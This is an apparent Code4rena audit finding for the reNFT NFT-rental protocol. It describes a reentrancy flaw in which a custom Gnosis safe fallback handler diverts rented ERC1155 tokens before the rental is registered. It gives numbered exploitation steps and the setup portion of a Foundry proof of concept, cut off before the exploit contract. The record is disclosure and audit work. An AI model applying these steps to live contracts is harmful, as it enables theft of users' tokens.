{
  "Title": "[H-03] An attacker can hijack any ERC1155 token he rents due to a design issue in reNFT via reentrancy exploitation",
  "Content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n***\n\n### The Vulnerability\n\n***\n\nIn order to make sense of the vulnerability, we need to understand the token transferral & rental registeration execution flow first.\n\n**Step 1**: First of all, before the fulfillment process begins, both the lender and the borrower need to approve the Seaport Conduit to spend their tokens on behalf of them. The lender approves the conduit to spend the NFT token which he wants to lend (offer item) and the borrower approves the ERC20 tokens he will use as a payment method for this rental (consideration item).\n\n**Step 2**: Once the fulfillment process begins, the conduit begins the token transferral process. The conduit transfers the lender's NFT tokens to the borrower's gnosis rental safe, then it transfers the borrower's ERC20 tokens to the Payment Escrow.\n\n*Note 1: Keep in mind that the rental is not registered yet.*.\n\n*Note 2: The Seaport Conduit utilizes the `safeTransferFrom` function to transfer the ERC1155 tokens which will trigger `onERC1155Receive` hook on the receiver of the ERC1155 tokens, in this case, it's the borrower's rental safe. However, when it comes to the transferral of ERC721 tokens, it uses `transferFrom` and not `safeTransferFrom`*.\n\n**Step 3**: Once the tokens are transferred, Seaport will communicate with the Zone contract. You can think of the zone contract as a contract holding a callback function which is called after all the swaps are made. The contract which will be holding the callback function to be executed by Seaport is [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) and the callback function it is holding, which as I mentioned, will be called by Seaport, is [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27).\n\n**Step 4**: Once the [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27) function is called, the rental registeration process will kick in. A series of internal functions will be called inside [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) which will verify the signatures of the order data it has received from seaport and then the internal function [\\_rentFromZone](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L530) will be called and this internal function will actually register the rental. It'll communicate with the [`Storage`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol) module which holds all the rental data and ask it to [add the rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595).\n\n**Step 5**: The rental is finally added.\n\nHere is the full execution flow.\n\n*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588).*\n\n***\n\n### The vulnerability\n\n***\n\nThe main vulnerability exists within the fact that reNFT does not register the rental except after swapping the tokens, in addition to `safeTransferFrom()` being used to transfer ERC1155 tokens, which would of course, trigger the callback function `onERC1155Receive()` on the borrower's safe.\n\nThe combination of those two factors allow for the exploitation of a reentrancy vulnerability allowing an attacker to hijack ANY ERC1155 tokens he rents.\n\n### Steps of exploitation\n\n***\n\n1.  The attacker will create a custom fallback handler contract which will contain an implementation of the `onERC1155Receive()` function, which will be triggered by the Seaport Conduit when it conducts the token swap and moves the lender's NFT tokens to the borrower's safe. The implementation of the `onERC1155Receive()` function will simply instruct the gnosis safe to transfer the tokens to the attacker's address.\n\n    **Since the rental is not yet registered, the guard will let the transferral occur normally**\n\n2.  The attacker will create the rental safe which he'll utilize to hijack the target ERC1155 token.\n\n3.  The attacker will set the fallback handler address of his safe to be the address of the custom fallback handler contract he created.\n\n4.  The attacker will initiate the rental process\n\n5.  When the conduit transfers the lender's ERC1155 token to the attacker's safe using `safeTransferFrom`. It'll request to call `onERC1155Receive()` on the attacker's safe, but the `onERC1155Receive()` callback function isn't implemented by default in the safe contract, so the safe contract will rely on the custom fallback handler (which the attacker set) and the `onERC1155Receive()` function in the fallback handler will be executed.\n\n6.  When the `onERC1155Receive()` callback is executed in the custom fallback handler contract, the fallback handler will instruct gnosis to move the ERC1155 token rented to the attacker's address. The gnosis guard will be disarmed and will allow the transferral to occur normally because it isn't aware of the rental at this point.\n\n7.  The ERC1155 token will be hijacked successfully.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC1155_Exploit -vvv`\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the off",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-01-renft",
  "Code": [
    {
      "filename": "contracts/base/FallbackManager.sol",
      "content": "// SPDX-License-Identifier: LGPL-3.0-only\npragma solidity >=0.7.0 <0.9.0;\n\nimport {SelfAuthorized} from \"../common/SelfAuthorized.sol\";\nimport {IFallbackManager} from \"../interfaces/IFallbackManager.sol\";\n\n/**\n * @title Fallback Manager - A contract managing fallback calls made to this contract\n * @author Richard Meissner - @rmeissner\n */\nabstract contract FallbackManager is SelfAuthorized, IFallbackManager {\n    // keccak256(\"fallback_manager.handler.address\")\n    bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;\n\n    /**\n     *  @notice Internal function to set the fallback handler.\n     *  @param handler contract to handle fallback calls.\n     */\n    function internalSetFallbackHandler(address handler) internal {\n        /*\n            If a fallback handler is set to self, then the following attack vector is opened:\n            Imagine we have a function like this:\n            function withdraw() internal authorized {\n                withdrawalAddress.call.value(address(this).balance)(\"\");\n            }\n\n            If the fallback method is triggered, the fallback handler appends the msg.sender address to the calldata and calls the fallback handler.\n            A potential attacker could call a Safe with the 3 bytes signature of a withdraw function. Since 3 bytes do not create a valid signature,\n            the call would end in a fallback handler. Since it appends the msg.sender address to the calldata, the attacker could craft an address \n            where the first 3 bytes of the previous calldata + the first byte of the address make up a valid function signature. The subsequent call would result in unsanctioned access to Safe's internal protected methods.\n            For some reason, solidity matches the first 4 bytes of the calldata to a function signature, regardless if more data follow these 4 bytes.\n        */\n        if (handler == address(this)) revertWithError(\"GS400\");\n\n        /* solhint-disable no-inline-assembly */\n        /// @solidity memory-safe-assembly\n        assembly {\n            sstore(FALLBACK_HANDLER_STORAGE_SLOT, handler)\n        }\n        /* solhint-enable no-inline-assembly */\n    }\n\n    // @inheritdoc IFallbackManager\n    function setFallbackHandler(address handler) public override authorized {\n        internalSetFallbackHandler(handler);\n        emit ChangedFallbackHandler(handler);\n    }\n\n    // @notice Forwards all calls to the fallback handler if set. Returns 0 if no handler is set.\n    // @dev Appends the non-padded caller address to the calldata to be optionally used in the handler\n    //      The handler can make us of `HandlerContext.sol` to extract the address.\n    //      This is done because in the next call frame the `msg.sender` will be FallbackManager's address\n    //      and having the original caller address may enable additional verification scenarios.\n    // solhint-disable-next-line payable-fallback,no-complex-fallback\n    fallback() external {\n        /* solhint-disable no-inline-assembly */\n        /// @solidity memory-safe-assembly\n        assembly {\n            // When compiled with the optimizer, the compiler relies on a certain assumptions on how the\n            // memory is used, therefore we need to guarantee memory safety (keeping the free memory point 0x40 slot intact,\n            // not going beyond the scratch space, etc)\n            // Solidity docs: https://docs.soliditylang.org/en/latest/assembly.html#memory-safety\n\n            let handler := sload(FALLBACK_HANDLER_STORAGE_SLOT)\n\n            if iszero(handler) {\n                return(0, 0)\n            }\n\n            let ptr := mload(0x40)\n            calldatacopy(ptr, 0, calldatasize())\n\n            // The msg.sender address is shifted to the left by 12 bytes to remove the padding\n            // Then the address without padding is stored right after the calldata\n            mstore(add(ptr, calldatasize()), shl(96, caller()))\n\n            // Add 20 bytes for the address appended add the end\n            let success := call(gas(), handler, 0, ptr, add(calldatasize(), 20), 0, 0)\n\n            returndatacopy(ptr, 0, returndatasize())\n            if iszero(success) {\n                revert(ptr, returndatasize())\n            }\n            return(ptr, returndatasize())\n        }\n        /* solhint-enable no-inline-assembly */\n    }\n}"
    },
    {
      "filename": "src/policies/Create.sol",
